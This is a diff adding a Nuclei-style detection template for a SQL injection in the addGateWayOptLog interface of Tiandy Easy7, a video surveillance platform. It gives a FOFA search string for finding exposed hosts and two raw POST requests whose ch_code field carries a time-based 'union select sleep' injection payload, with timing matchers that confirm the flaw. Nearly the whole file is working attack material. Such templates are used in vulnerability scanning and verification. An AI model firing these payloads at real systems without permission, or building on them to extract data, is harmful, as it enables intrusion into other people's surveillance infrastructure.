@@ -1,0 +1,38 @@
+id: tiandy-easy7-addgatewayoptlog-sqli
+info:
+  name: 天地伟业Easy7 addGateWayOptLog接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="Tiandy-Easy7"
+      漏洞类型：基于addGateWayOptLog接口的SQL注入
+      技术特征：通过构造恶意输入参数可实现数据库查询语句篡改
+      影响范围：Tiandy-Easy7系统日志处理模块
+      风险等级：高危（可导致数据库敏感信息泄露）
+  tags: 天地伟业Easy7
+http:
+- raw:
+  - |
+    POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+
+    gateLog={"gateLogList":[{"ch_code":"1'union select sleep(5)--+","ch_caption":"1","dt_time":"1"}]}
+  - |
+    POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+
+    gateLog={"gateLogList":[{"ch_code":"1'union select sleep(8)--+","ch_caption":"1","dt_time":"1"}]}
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
